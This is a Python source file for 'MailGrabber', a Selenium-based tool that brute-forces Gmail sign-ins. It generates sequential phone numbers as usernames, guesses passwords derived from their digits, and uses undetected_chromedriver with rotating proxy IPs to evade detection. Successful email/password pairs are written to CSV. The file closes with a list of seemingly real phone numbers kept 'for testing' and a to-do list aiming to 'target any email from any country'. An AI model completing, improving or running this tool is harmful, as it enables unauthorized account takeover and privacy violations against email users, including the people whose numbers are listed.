from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from time import sleep
import pandas as pd
from datetime import date, datetime
from selenium.webdriver.chrome.options import Options
import undetected_chromedriver as uc
import random
from src.const import PASSWORD_URL, GMAIL_URL, NEXT_BUTTON


class MailGrabber(uc.Chrome):
    def __init__(self, driver=uc.Chrome, teardown=False, proxy=None):
        self.driver = driver
        self.teardown = teardown
        self.proxy = proxy
        self.show_intro()
        self.instructions()
        super(MailGrabber, self).__init__(options=self.get_chrome_options())

    def go_to_gmail(self, url):
        if url is not None:
            self.get(url)
        else:
            return None

    def get_chrome_options(self):
        chrome_options = Options()
        if self.proxy:
            chrome_options.add_argument("--window-size=720,1280")
            chrome_options.add_argument(f'--proxy-server={self.proxy}')
        return chrome_options

    def rotate_proxy(self):
        proxies = ['http://168.196.236.235:50100', 'http://168.196.236.235:50101', 'http://2.33.4.5:2322']
        self.proxy = random.choice(proxies)
        self.options = self.get_chrome_options()
        self.quit()  # close the current browser window
        super(MailGrabber, self).__init__(options=self.options)  # create a new browser instance

    def show_intro(self):
        text = "WELCOME TO MAILGRABBER"
        headline = text.upper().center(80)
        print('\033[32m' + headline + '\033[0m')

    def instructions(self):
        text = "DISCLAIMER"
        print(text.upper().center(80))
        print("1. Don't use same number everytime")
        print("2. Don't give a long try! It may causes issue")
        print("3. Happy Hacking!")
        print("")
        print("")

    def solve_captcha(self):
        pass

    def convert_to_dataframe(self, s_arr, f_arr):
        data_frame = pd.DataFrame({
            "Email": s_arr,
            "Password": f_arr
        })
        data_frame.to_csv(f"{datetime.now}.csv", index=False)

    # def start_grabbing(self, x_path, number, amount, length_of_password):
    #     arr = []
    #     pass_arr = []
    #     success_email = []
    #     password_url = PASSWORD_URL
    #
    #     gmail_url = GMAIL_URL
    #     mail_match = False
    #     password_match = False
    #
    #     wait = WebDriverWait(self, 20)
    #
    #     email = wait.until(EC.element_to_be_clickable((By.XPATH, x_path)))
    #
    #     submit_email = wait.until(EC.element_to_be_clickable((
    #         By.XPATH, "//span[normalize-space()='Next']"
    #     )))
    #     email.click()
    #     i = 1
    #     k = 1
    #     while i <= amount:
    #         i += 1
    #         number = int(number) + 1
    #         number_str = "0{}".format(number)
    #         arr.append(number_str)
    #         pass_arr.append(str(number)[:length_of_password])
    #     print("Numbers for bypassing Email => " + str(arr))
    #     print("Chosen Passwords => " + str(pass_arr))
    #     sleep(2)
    #     # while k <= amount and len(arr) > 0:
    #     #     k += 1
    #     for j in arr:
    #         email.send_keys(j)
    #         arr.remove(j)
    #         sleep(3)
    #         submit_email.click()
    #         email.clear()
    #         sleep(3)
    #         print("Tried : " + str(j))
    #         if self.current_url == password_url:
    #             print("One email worked")
    #             success_email.append(j)
    #             print("Success Email" + str(j))
    #             # pass password from here
    #             # while k <= amount:
    #             #     k += 1
    #             for z in pass_arr:
    #                 password = wait.until(EC.element_to_be_clickable((
    #                     By.XPATH, "//input[@name='Passwd']"
    #                 )))
    #                 password.click()
    #                 password.send_keys(z)
    #                 next_button = wait.until(EC.element_to_be_clickable((
    #                     By.XPATH, NEXT_BUTTON
    #                 )))
    #                 next_button.click()
    #                 if self.current_url == gmail_url:
    #                     password_match = True
    #                     print("Email Matched: " + str(j) + password + str(z))
    #                     self.convert_to_dataframe(arr, pass_arr)
    #             sleep(3)
    #             break
    #
    #         # email.clear()
    #         # break
    #     print("Numbers logs = > ", arr)
    #     print("Testing all the numbers....")
    #     print("Tried => ", len(arr), "times")
    #     self.quit()

    def get_current_url(self):
        print(self.current_url)

    def start_grabbing(self, x_path, number, amount, length_of_password):
        arr = []
        pass_arr = []
        success_email = []
        password_url = PASSWORD_URL

        gmail_url = GMAIL_URL

        wait = WebDriverWait(self, 20)
        email = wait.until(EC.element_to_be_clickable((By.XPATH, x_path)))

        submit_email = wait.until(EC.element_to_be_clickable((
            By.XPATH, "//span[normalize-space()='Next']"
        )))
        email.click()
        i = 1
        k = 1
        while i <= amount:
            i += 1
            number = int(number) + 1
            number_str = "0{}".format(number)
            arr.append(number_str)
            pass_arr.append(str(number)[:length_of_password])
        print("Numbers for bypassing Email => " + str(arr))
        print("Chosen Passwords => " + str(pass_arr))
        sleep(2)
        while k <= amount:
            k += 1
            for j in arr:
                email.send_keys(j)
                sleep(2)
                submit_email.click()
                print("Tried : " + str(j))
                if self.current_url == password_url:
                    print("One email worked")
                    success_email.append(j)
                    print("Success Email" + str(j))
                    # pass password from here
                for z in pass_arr:
                    password = wait.until(EC.element_to_be_clickable((
                        By.XPATH, "//input[@name='Passwd']"
                    )))
                    password.click()
                    password.send_keys(z)
                    next_button = wait.until(EC.element_to_be_clickable((
                        By.XPATH, NEXT_BUTTON
                    )))
                    next_button.click()
                    if self.current_url == gmail_url:
                        print("Email Matched: " + str(j) + password + str(z))
                        self.convert_to_dataframe(arr, pass_arr)
                sleep(2)
                # email.clear()
                # break
        print("Numbers logs = > ", arr)
        print("Testing all the numbers....")
        print("Tried => ", len(arr), "times")
        self.quit()

"""
for testing numbers
+18327321445
+13125860756
+17322496289
+19566222852
+12295853598
+13127424480
"""

# can target any email from any country


"""
1. Need to keep trying the loop until the arrays are empty | PENDING
2. If try again window comes up then press try again and continue trying where it lefts off | PENDING
3. If email or password matches then store it and show it | PENDING
4. can target any email from any country | PENDING
5. will need a function to add country code. | PENDING
6. need to make shorter and optimize code
"""